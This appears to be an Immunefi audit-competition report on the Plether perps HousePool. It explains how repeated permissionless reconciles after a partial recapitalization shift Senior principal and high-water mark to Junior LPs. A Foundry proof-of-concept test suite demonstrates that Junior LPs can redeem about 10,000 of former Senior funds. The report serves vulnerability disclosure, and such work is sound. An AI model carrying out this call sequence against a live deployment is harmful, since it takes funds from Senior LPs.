# \#99653 [SC-High] A partly settled recapitalization is settled again on the next reconcile, moving Senior principal to Junior

**Submitted on Nov 14th 2026 at 16:55:59 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99653
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description



# Summary

When the pool owes traders more than it holds, the runbook tells the owner to recapitalize (SECURITY.md:1509). Only the part of the recapitalization above the deficit is real LP equity, so the first reconcile credits that part to Senior and leaves the rest queued. That is the intended behaviour, and the repo has a test for it.

The problem is the next reconcile. Nothing has changed, no cash has moved and no price has moved, but the queued leftover is settled again against the same equity that already backs Senior's principal. Senior's principal is written off as a loss, the recapitalization is applied a second time with a smaller target, and revenue that was queued during the wipe goes to Junior.

Using the repo's own fixture, Senior principal drops from 25,000 to 15,000 and Junior goes from 0 to 10,000 on a reconcile where nothing happened. Senior's high-water mark drops from 40,000 to 15,000. Junior LPs can redeem the 10,000.

# Description

A recapitalization is always queued in pendingRecapitalizationAssets, and revenue is queued in pendingTradingRevenueAssets while both tranche principals are zero (HousePool.sol:644-648). Reconcile is supposed to settle only the queued value that is actually backed and keep the rest reserved until it is. The team said exactly this in two earlier audit responses, and the repo test for this case is called test_PartialMixedInflowsPreserveFullIntentAndSettleResidualLater.

The first reconcile does that correctly. The second one does not, for three reasons that chain together.

First, HousePool._settleablePendingClaimantBuckets (HousePool.sol:1829-1834) caps the queue with capClaimantBuckets (HousePoolPendingPreviewLib.sol:72-82) against the pool's whole distributable equity. After a partial pass, all of that equity already backs the principal the first pass created, but the leftover queue is still treated as payable against it.

Second, planReconcile sets that amount aside before it looks at principal (HousePoolReconcilePlanLib.sol:68-71). Existing principal is then compared against zero and absorbed as a loss (:102-104).

Third, _applyPendingClaimantBucketsLive (HousePool.sol:1759-1776) applies the queue again. Principal is back at zero, so applyClaimantRecapitalizationIntent takes its start-from-zero branch a second time (HousePoolPendingPreviewLib.sol:117-122) and sets Senior's high-water mark from what is left in the queue instead of the original recapitalization. With the mark now equal to Senior's principal, the queued revenue sees no Senior shortfall and is credited to Junior. HousePool stores all of this and reduces the queue (HousePool.sol:1790-1791).

Here is the same thing in numbers, with the setup taken from the repo test. LP principal has been wiped but both tranches still have shareholders. The owner recapitalizes 40,000, 15,000 of revenue was queued during the wipe, and traders are owed 30,000. The pool holds 55,000, so LP equity is 25,000 and stays there.

After the first reconcile Senior has 25,000, Junior has 0, Senior's mark is 40,000, and 15,000 of recapitalization plus 15,000 of revenue are still queued. This is the result the repo test asserts.

After a second reconcile, with nothing changed, Senior has 15,000, Junior has 10,000, Senior's mark is 15,000, and only 5,000 of revenue is still queued. A third reconcile clears that last 5,000 and the split stays at 15,000 and 10,000.

If the trader claims are later cleared and equity returns to 55,000, Senior ends with 15,000 and Junior with 40,000. The repo test, which clears the claims before reconciling a second time, ends with Senior at 40,000 and Junior at 15,000 from the same inputs. The only difference between the two outcomes is how many times reconcile ran in between.

Reaching this does not need the owner beyond the recapitalization itself. HousePool.settleLpEpoch is permissionless when there are no open positions and runs the same _reconcile (HousePool.sol:835). It needs one queue item to make progress, and a Junior redemption request that is worth zero gets refunded, which counts as progress as long as no Senior request is waiting ahead of it. A second call then reassigns the principal and, in the same transaction, funds Junior redemptions at the new Junior principal. The share previews move even earlier: once the first reconcile is stored, TrancheVault.totalAssets() already reports 15,000 for Senior and 10,000 for Junior.

This is separate from the leftover staying reserved and blocking LP exits, which is about the queue not shrinking. It is also separate from the high-water mark being overwritten on a first recapitalization from zero, which takes one reconcile and needs a recapitalization smaller than the old mark. Here the mark set by the recapitalization itself is cut on later reconciles, and existing principal changes hands.

A fix needs the pool to remember that a queued amount has already had a partial pass, so the leftover is never paid against equity that already backs principal and the start-from-zero branch cannot run again with a reduced target.

# Impact

Direct theft of user funds at rest.

After the first reconcile, 25,000 is stored as Senior principal and backs Senior LP shares. One reconcile later, 10,000 of it belongs to Junior, although no cash and no price moved. Junior has no claim to that money under the protocol's own rules, because queued revenue has to restore Senior to its high-water mark of 40,000 before Junior receives anything, and Senior was only at 25,000.

Junior LPs can take the 10,000 out through the normal redemption path, and any Junior LP can trigger the reassignment by calling settlement.

Senior LPs also lose their priority on future recovery. The mark falls from 40,000 to 15,000, so when the pool recovers to 55,000 Senior holds 15,000 where it should hold 40,000. In total Senior ends 25,000 short and Junior 25,000 ahead.

Senior plus Junior principal still equals LP equity at every step, so traders and pool solvency are not affected. The loss falls entirely on Senior LPs and the gain goes entirely to Junior LPs.

## Proof of Concept

## Proof of Concept


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAccountingParityBase} from "./HousePoolSnapshotParity.t.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {StdStorage, stdStorage} from "forge-std/StdStorage.sol";

/// @notice PoC: a partly settled recapitalization is settled again on the next reconcile with nothing changed.
contract HousePoolResidualDoubleSettlePoC is HousePoolAccountingParityBase {

    using stdStorage for StdStorage;

    address internal constant JUNIOR_LP = address(0xBEEF);
    address internal constant SENIOR_LP = address(0x5E11);
    address internal constant ANYONE = address(0xCAFE);

    // Only seed shares plus the explicit LPs below, so the junior LP owns ~all unlocked junior shares.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _wipePrincipal() internal {
        settlementToken.burn(address(pool), pool.totalAssets());
        vm.prank(address(juniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(seniorVault.totalSupply(), 0, "senior ownership survives the wipe");
        assertGt(juniorVault.totalSupply(), 0, "junior ownership survives the wipe");
    }

    function _setClaims(
        uint256 amount
    ) internal {
        stdstore.target(address(engine)).sig("totalTraderClaimBalanceAssets()").checked_write(amount);
    }

    function _vaultReconcile() internal {
        vm.prank(address(juniorVault));
        pool.reconcile();
    }

    function _logState(
        string memory label
    ) internal {
        emit log(label);
        emit log_named_decimal_uint("  seniorPrincipal", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("  juniorPrincipal", pool.juniorPrincipal(), 6);
        emit log_named_decimal_uint("  seniorHighWaterMark", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("  unassignedAssets", pool.unassignedAssets(), 6);
        emit log_named_decimal_uint("  pendingRecapitalization", pool.pendingRecapitalizationAssets(), 6);
        emit log_named_decimal_uint("  pendingTradingRevenue", pool.pendingTradingRevenueAssets(), 6);
        emit log_named_decimal_uint("  pool USDG balance", settlementToken.balanceOf(address(pool)), 6);
    }

    function _assertState(
        uint256 senior,
        uint256 junior,
        uint256 hwm,
        uint256 pendingRecap,
        uint256 pendingRevenue,
        string memory label
    ) internal view {
        assertEq(pool.seniorPrincipal(), senior, string.concat(label, ": senior"));
        assertEq(pool.juniorPrincipal(), junior, string.concat(label, ": junior"));
        assertEq(pool.seniorHighWaterMark(), hwm, string.concat(label, ": hwm"));
        assertEq(pool.unassignedAssets(), 0, string.concat(label, ": unassigned"));
        assertEq(pool.pendingRecapitalizationAssets(), pendingRecap, string.concat(label, ": pending recap"));
        assertEq(pool.pendingTradingRevenueAssets(), pendingRevenue, string.concat(label, ": pending revenue"));
    }

    function _setupRepoScenario() internal {
        _wipePrincipal();
        _recordInflow(IHousePool.ClaimantInflowKind.Recapitalization, 40_000e6);
        _recordInflow(IHousePool.ClaimantInflowKind.Revenue, 15_000e6);
        _setClaims(30_000e6);
    }

    /// Same inputs as test_PartialMixedInflowsPreserveFullIntentAndSettleResidualLater, but the second reconcile
    /// happens before the trader claims are cleared. Nothing changes between reconciles.
    function test_PoC_NoOpReconcileMovesSeniorPrincipalToJunior() public {
        _setupRepoScenario();

        _vaultReconcile();
        _logState("after reconcile #1 (what the repo test asserts)");
        _assertState(25_000e6, 0, 40_000e6, 15_000e6, 15_000e6, "reconcile #1");

        // Previews already price the reassignment once reconcile #1 is stored.
        emit log_named_decimal_uint("  seniorVault.totalAssets() preview", seniorVault.totalAssets(), 6);
        emit log_named_decimal_uint("  juniorVault.totalAssets() preview", juniorVault.totalAssets(), 6);
        assertEq(seniorVault.totalAssets(), 15_000e6, "senior preview already reflects the shift");
        assertEq(juniorVault.totalAssets(), 10_000e6, "junior preview already reflects the shift");

        uint256 balanceBefore = settlementToken.balanceOf(address(pool));
        uint256 accountedBefore = pool.accountedAssets();
        uint256 claimsBefore = engine.totalTraderClaimBalanceAssets();

        _vaultReconcile();
        _logState("after reconcile #2 (no cash, price or claim change)");
        assertEq(settlementToken.balanceOf(address(pool)), balanceBefore, "no cash moved");
        assertEq(pool.accountedAssets(), accountedBefore, "no accounted change");
        assertEq(engine.totalTraderClaimBalanceAssets(), claimsBefore, "claims unchanged");
        _assertState(15_000e6, 10_000e6, 15_000e6, 0, 5000e6, "reconcile #2");

        _vaultReconcile();
        _logState("after reconcile #3");
        _assertState(15_000e6, 10_000e6, 15_000e6, 0, 0, "reconcile #3");

        // Later recovery: trader claims clear, LP equity returns to 55,000.
        _setClaims(0);
        _vaultReconcile();
        _logState("after recovery reconcile (claims cleared)");
        _assertState(15_000e6, 40_000e6, 15_000e6, 0, 0, "recovery");
    }

    /// Control: the repo's own path (claims cleared before the second reconcile) from identical inputs.
    function test_PoC_Control_RepoOrderingGivesSeniorItsTarget() public {
        _setupRepoScenario();
        _vaultReconcile();
        _assertState(25_000e6, 0, 40_000e6, 15_000e6, 15_000e6, "reconcile #1");
        _setClaims(0);
        _vaultReconcile();
        _logState("control: claims cleared before reconcile #2");
        _assertState(40_000e6, 15_000e6, 40_000e6, 0, 0, "control");
    }

    /// Same mechanism with no queued revenue: repeated no-op reconciles decay the senior mark.
    function test_PoC_PureRecapitalizationMarkDecays() public {
        _wipePrincipal();
        _recordInflow(IHousePool.ClaimantInflowKind.Recapitalization, 40_000e6);
        _setClaims(30_000e6);

        _vaultReconcile();
        _assertState(10_000e6, 0, 40_000e6, 30_000e6, 0, "pure #1");
        _vaultReconcile();
        _assertState(10_000e6, 0, 30_000e6, 20_000e6, 0, "pure #2");
        _vaultReconcile();
        _assertState(10_000e6, 0, 20_000e6, 10_000e6, 0, "pure #3");
        _vaultReconcile();
        _assertState(10_000e6, 0, 10_000e6, 0, 0, "pure #4");

        _setClaims(0);
        _vaultReconcile();
        _logState("pure recap: recovery after decayed mark");
        // Recapitalization is documented never to accrue to junior; here 30,000 of it ends up there.
        _assertState(10_000e6, 30_000e6, 10_000e6, 0, 0, "pure recovery");
    }

    function _settleAs(
        address caller
    ) internal returns (IHousePool.LpEpochSettlementResult memory result) {
        vm.prank(caller);
        result = pool.settleLpEpoch(0, 0);
    }

    /// End to end with real entry points: owner recapitalizePool, permissionless settleLpEpoch from an arbitrary
    /// address, and a junior LP redeeming value that was senior principal one settlement earlier.
    function test_PoC_PermissionlessSettlementRealizesShiftAndPaysJunior() public {
        _fundJunior(JUNIOR_LP, 100_000e6);
        _fundSenior(SENIOR_LP, 20_000e6);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);

        _wipePrincipal();
        assertLt(pool.seniorHighWaterMark(), 40_000e6, "old mark below recap, so no first-pass overwrite issue");

        // Owner follows the runbook and recapitalizes through the real engine entry point.
        settlementToken.mint(address(this), 40_000e6);
        settlementToken.approve(address(engine), 40_000e6);
        engine.recapitalizePool(40_000e6);
        // Revenue that arrived while both principals were zero (queued by recordClaimantInflow).
        _recordInflow(IHousePool.ClaimantInflowKind.Revenue, 15_000e6);
        _setClaims(30_000e6);

        // Junior LP requests a redemption that is worth zero; its refund is the queue progress for settlement #1.
        uint256 juniorShares = juniorVault.maxRequestRedeem(JUNIOR_LP);
        assertGt(juniorShares, 0, "junior LP has unlocked shares");
        vm.prank(JUNIOR_LP);
        uint256 firstRequest = juniorVault.requestRedeem(juniorShares, JUNIOR_LP, JUNIOR_LP);
        vm.warp(pool.lpEpochStart(firstRequest));

        IHousePool.LpEpochSettlementResult memory first = _settleAs(ANYONE);
        _logState("after permissionless settlement #1");
        assertEq(first.juniorProcessedEpochs, 1, "zero-value junior request refunded as progress");
        assertEq(first.juniorFundedAssets, 0, "nothing paid on settlement #1");
        _assertState(25_000e6, 0, 40_000e6, 15_000e6, 15_000e6, "settlement #1");

        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeemRefund(firstRequest, JUNIOR_LP, JUNIOR_LP);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);

        juniorShares = juniorVault.maxRequestRedeem(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 secondRequest = juniorVault.requestRedeem(juniorShares, JUNIOR_LP, JUNIOR_LP);
        vm.warp(pool.lpEpochStart(secondRequest));

        uint256 juniorUsdgBefore = settlementToken.balanceOf(JUNIOR_LP);
        IHousePool.LpEpochSettlementResult memory second = _settleAs(ANYONE);
        _logState("after permissionless settlement #2");
        emit log_named_decimal_uint("  junior funded on settlement #2", second.juniorFundedAssets, 6);
        assertEq(pool.seniorHighWaterMark(), 15_000e6, "senior mark cut from 40,000 to 15,000");
        assertEq(pool.seniorPrincipal(), 15_000e6, "senior principal cut from 25,000 to 15,000");
        assertGt(second.juniorFundedAssets, 9_800e6, "junior redemption funded from former senior principal");

        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeem(secondRequest, second.juniorFundedShares, JUNIOR_LP, JUNIOR_LP);
        uint256 received = settlementToken.balanceOf(JUNIOR_LP) - juniorUsdgBefore;
        emit log_named_decimal_uint("  USDG received by junior LP", received, 6);
        assertGt(received, 9_800e6, "junior LP walks away with ~10,000 that was senior principal");
    }

}
```

Run it from the repo root:

```bash
forge test --root packages/perps --match-contract HousePoolResidualDoubleSettlePoC -vv
```
